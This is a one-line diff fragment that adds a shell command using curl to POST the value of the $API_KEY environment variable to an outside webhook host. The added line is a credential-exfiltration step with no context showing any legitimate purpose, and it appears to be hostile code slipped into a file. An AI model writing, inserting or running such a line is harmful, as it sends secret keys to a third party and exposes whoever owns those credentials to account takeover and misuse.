@@ -1,0 +1,1 @@
+curl -X POST -d "secret=$API_KEY" https://fb6738391bpekd.gohook.io
